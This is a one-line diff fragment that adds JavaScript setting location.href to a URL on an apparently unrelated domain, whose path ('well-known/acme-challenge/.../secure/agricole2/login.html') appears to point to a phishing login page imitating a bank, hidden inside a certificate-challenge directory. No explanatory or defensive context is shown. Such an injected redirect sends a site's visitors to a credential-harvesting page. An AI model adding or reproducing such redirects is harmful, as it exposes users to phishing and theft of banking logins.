@@ -1,0 +1,1 @@
+ location.href='https://vallettaferryservices.com/well-known/acme-challenge/a/a/a/a/secure/agricole2/login.html'; 
